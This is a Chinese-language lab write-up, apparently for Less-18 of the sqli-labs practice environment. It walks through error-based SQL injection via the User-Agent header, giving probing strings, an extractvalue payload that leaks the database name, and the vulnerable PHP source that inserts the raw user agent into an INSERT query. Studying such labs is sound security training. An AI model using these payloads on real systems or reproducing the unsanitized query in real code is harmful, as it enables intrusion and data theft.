# Less-18

## 0x00 注入

注入位置在request的User-Agent。

单引号报错。

![image-20210115164534491](D:\WEB安全\笔记\image\image-20210115164534491.png)

') 报错

![image-20210115164607190](D:\WEB安全\笔记\image\image-20210115164607190.png)

')# 报错

![image-20210115164630437](D:\WEB安全\笔记\image\image-20210115164630437.png)

','192.168.0.104','admin')# 无报错

![image-20210115165452245](D:\WEB安全\笔记\image\image-20210115165452245.png)

这里打算使用extractvalue进行报错注入。失败。

分析源码。

uname和passwd都被过滤了，无法作为注入点。

把目光放在User-Agent上。

通过分析源码，后台做了一次insert操作。将user-agent，ip和uname插入数据库。

user-agent是可控的。

123', 1, extractvalue(1, concat('~', database())))#

使用extractvalue进行错误注入。

insert语句是不能和and做连接的。

但是insert语句里，要插入的值可以是表达式的结果。



## 0x01 分析

```php
$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
	$result1 = mysql_query($sql);
	$row1 = mysql_fetch_array($result1);
		if($row1)
			{
			echo '<font color= "#FFFF00" font size = 3 >';
			$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
			mysql_query($insert);
			//echo 'Your IP ADDRESS is: ' .$IP;
			echo "</font>";
			//echo "<br>";
			echo '<font color= "#0000ff" font size = 3 >';			
			echo 'Your User Agent is: ' .$uagent;
			echo "</font>";
			echo "<br>";
			print_r(mysql_error());			
			echo "<br><br>";
			echo '<img src="../images/flag.jpg"  />';
			echo "<br>";
			
			}
		else
			{
			echo '<font color= "#0000ff" font size="3">';
			//echo "Try again looser";
			print_r(mysql_error());
			echo "</br>";			
			echo "</br>";
			echo '<img src="../images/slap.jpg"   />';	
			echo "</font>";  
			}

```
